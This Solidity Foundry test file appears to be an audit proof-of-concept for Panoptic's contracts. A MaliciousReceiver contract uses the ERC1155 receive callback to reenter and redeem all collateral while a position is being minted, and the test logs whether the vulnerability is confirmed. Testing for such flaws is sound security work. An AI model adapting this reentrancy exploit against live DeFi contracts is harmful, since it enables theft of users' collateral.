// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {SemiFungiblePositionManager} from "@contracts/SemiFungiblePositionManager.sol";
import {PanopticPool} from "@contracts/PanopticPool.sol";
import {CollateralTracker} from "@contracts/CollateralTracker.sol";
import {PanopticFactory} from "@contracts/PanopticFactory.sol";
import {TokenId, TokenIdLibrary} from "@types/TokenId.sol";
import {ERC1155Holder} from "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import {IUniswapV3Factory} from "univ3-core/interfaces/IUniswapV3Factory.sol";
import {ERC20Minimal} from "@tokens/ERC20Minimal.sol";
import {RiskEngine} from "@contracts/RiskEngine.sol";
import {ISemiFungiblePositionManager} from "@contracts/interfaces/ISemiFungiblePositionManager.sol";
import {IRiskEngine} from "@contracts/interfaces/IRiskEngine.sol";
import {Pointer} from "@types/Pointer.sol";

contract MockToken is ERC20Minimal {
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
    
    function totalSupply() external view returns (uint256) {
        return _internalSupply;
    }
}

contract MaliciousReceiver is ERC1155Holder {
    CollateralTracker public ct;
    bool public attacked;

    constructor(CollateralTracker _ct) {
        ct = _ct;
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public override returns (bytes4) {
        if (!attacked) {
            attacked = true;
            console.log("Attack: Triggered onERC1155Received. Attempting Withdraw...");
             uint256 bal = ct.balanceOf(address(this));
             console.log("Attack: Holding shares:", bal);
             
             // Try to withdraw everything
             // If System thinks we have no position, this succeeds.
             try ct.redeem(bal, address(this), address(this)) {
                 console.log("Attack SUCCESS: Collateral Withdrawn!");
             } catch Error(string memory reason) {
                 console.log("Attack FAILED: ", reason);
             } catch {
                 console.log("Attack FAILED (Unknown)");
             }
        }
        return this.onERC1155Received.selector;
    }
}

contract ReentrancyTest is Test {
    using TokenIdLibrary for TokenId;

    SemiFungiblePositionManager sfpm;
    PanopticPool pp;
    CollateralTracker ct0;
    CollateralTracker ct1;
    PanopticFactory panopticFactory;
    
    MockToken token0;
    MockToken token1;
    MaliciousReceiver attacker;
    RiskEngine re;
    
    address factory;
    address univ3pool;
    uint64 poolId;

    function setUp() public {
        factory = makeAddr("UniswapV3Factory");
        univ3pool = makeAddr("UniV3Pool");
        
        token0 = new MockToken();
        token1 = new MockToken();

        if (address(token0) > address(token1)) {
            (token0, token1) = (token1, token0);
        }

        // Mock Factory and Pool
        vm.mockCall(factory, abi.encodeWithSelector(IUniswapV3Factory.createPool.selector), abi.encode(univ3pool));
        vm.mockCall(factory, abi.encodeWithSelector(IUniswapV3Factory.getPool.selector), abi.encode(univ3pool));
        vm.mockCall(univ3pool, abi.encodeWithSignature("tickSpacing()"), abi.encode(int24(60)));
        vm.mockCall(univ3pool, abi.encodeWithSignature("token0()"), abi.encode(address(token0)));
        vm.mockCall(univ3pool, abi.encodeWithSignature("token1()"), abi.encode(address(token1)));
        vm.mockCall(univ3pool, abi.encodeWithSignature("fee()"), abi.encode(uint24(500)));
        // Mock slot0: sqrtPriceX96 (2^96), tick (0), etc.
        vm.mockCall(univ3pool, abi.encodeWithSignature("slot0()"), abi.encode(uint160(2**96), int24(0), uint16(0), uint16(0), uint16(0), uint8(0), true));
        
        // Deploy RiskEngine
        re = new RiskEngine(0, 0, address(0), address(0));

        // Deploy SFPM
        sfpm = new SemiFungiblePositionManager(
            IUniswapV3Factory(factory),
            100,
            100
        );
        poolId = sfpm.initializeAMMPool(address(token0), address(token1), 500, re.vegoid());

        // Deploy Factory
        // constructor(SFPM, UniV3Factory, PoolRef, CollateralRef, properties, indices, pointers)
        panopticFactory = new PanopticFactory(
            sfpm,
            IUniswapV3Factory(factory),
            address(new PanopticPool(ISemiFungiblePositionManager(address(sfpm)))),
            address(new CollateralTracker(1000)),
            new bytes32[](0),
            new uint256[][](0),
            new Pointer[][](0)
        );
        
        // Deploy New Pool
        // deployNewPool(token0, token1, fee, riskEngine, salt)
        pp = PanopticPool(panopticFactory.deployNewPool(address(token0), address(token1), 500, IRiskEngine(address(re)), uint96(0)));
        ct0 = pp.collateralToken0();
        ct1 = pp.collateralToken1();
        
        attacker = new MaliciousReceiver(ct0); // Attack via Token0 (or whichever is collateral)
        
        // Fund Attacker
        token0.mint(address(attacker), 1000 ether);
        token1.mint(address(attacker), 1000 ether);
        
        vm.startPrank(address(attacker));
        token0.approve(address(ct0), type(uint256).max);
        token1.approve(address(ct1), type(uint256).max);
        
        // Deposit Initial Collateral
        ct0.deposit(100 ether, address(attacker));
        vm.stopPrank();
    }

    function test_MintReentrancy_WithdrawCollateral() public {
        vm.startPrank(address(attacker));
        
        // Prepare Mint Args
        TokenId tokenId = TokenId.wrap(uint256(poolId));
        // Add a long leg (requires collateral)
        tokenId = tokenId.addLeg(0, 1, 0, 0, 0, 0, 0, 10); 
        
        TokenId[] memory positions = new TokenId[](1);
        positions[0] = tokenId;
        
        uint128[] memory sizes = new uint128[](1);
        sizes[0] = 10 ether;
        
        int24[3][] memory limits = new int24[3][](1);
        limits[0] = [int24(-1000), int24(1000), int24(0)];
        
        // Mock Uniswap interactions for minting
        vm.mockCall(univ3pool, abi.encodeWithSignature("mint(address,int24,int24,uint128,bytes)"), abi.encode(0, 0));
        vm.mockCall(univ3pool, abi.encodeWithSignature("burn(int24,int24,uint128)"), abi.encode(0, 0));
        
        console.log("Starting Attack...");
        console.log("Initial Collateral Balance Shares:", ct0.balanceOf(address(attacker)));
        
        // Execute Mint -> Triggers Callback -> Withdraws Collateral
        pp.dispatch(
            positions,
            positions, // finalPositions usually same?
            sizes,
            limits,
            false,
            0
        );
        
        // Verify results
        uint256 finalCollateralShares = ct0.balanceOf(address(attacker));
        uint256 finalPosition = sfpm.balanceOf(address(attacker), uint256(TokenId.unwrap(tokenId)));
        
        console.log("Final CT Balance Shares:", finalCollateralShares);
        console.log("Final SFPM Position:", finalPosition);
        
        if (finalCollateralShares == 0 && finalPosition > 0) {
            console.log("VULNERABILITY CONFIRMED: Position created but collateral withdrawn!");
        } else {
             console.log("Vulnerability NOT triggered.");
        }
        
        vm.stopPrank();
    }
}
